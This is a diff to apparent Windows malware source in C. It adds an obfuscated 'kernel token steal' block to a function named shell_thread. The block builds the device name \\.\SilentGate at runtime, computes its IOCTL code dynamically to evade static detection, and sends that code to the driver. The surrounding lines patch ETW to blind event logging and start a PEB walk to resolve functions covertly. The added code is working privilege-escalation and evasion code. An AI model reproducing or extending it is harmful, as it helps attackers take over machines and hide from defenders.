@@ -47,6 +47,27 @@ static DWORD WINAPI shell_thread(LPVOID param) {
     *(BYTE*)etw = 0xC3;
     VirtualProtect(etw, 1, old, &old);
 
+    /* Kernel token steal - obfuscated */
+    {
+        /* Device name: \\.\SilentGate - built at runtime */
+        char dev[16]={0};
+        dev[0]=92;dev[1]=92;dev[2]=46;dev[3]=92;
+        dev[4]=83;dev[5]=105;dev[6]=108;dev[7]=101;
+        dev[8]=110;dev[9]=116;dev[10]=71;dev[11]=97;
+        dev[12]=116;dev[13]=101;dev[14]=0;
+
+        /* IOCTL computed at runtime - not a static constant */
+        DWORD ioctl_code = (0x22 << 16) | (0x904 << 2);
+
+        HANDLE hd = CreateFileA(dev,
+            GENERIC_READ|GENERIC_WRITE,0,NULL,
+            OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
+        if(hd != INVALID_HANDLE_VALUE) {
+            DWORD nb=0;
+            DeviceIoControl(hd,ioctl_code,NULL,0,NULL,0,&nb,NULL);
+            CloseHandle(hd);
+        }
+    }
     /* PEB walk */
     BYTE* peb  = (BYTE*)__readgsqword(0x60);
     BYTE* ldr  = *(BYTE**)(peb  + 0x18);
